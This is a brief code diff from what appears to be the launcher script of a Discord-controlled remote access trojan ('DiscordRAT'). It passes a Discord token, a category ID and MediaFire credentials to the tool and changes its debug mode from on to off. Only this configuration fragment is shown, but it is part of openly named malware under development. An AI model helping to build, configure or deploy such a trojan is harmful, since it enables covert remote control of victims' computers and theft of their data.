@@ -21,7 +21,7 @@ RAT = DiscordRAT(
     config["categoryID"],
     optionalConfig["mediafireEmail"],
     optionalConfig["mediafirePassword"],
-    debugMode=True
+    debugMode=False
 )
 
 RAT.run(config["discordToken"])
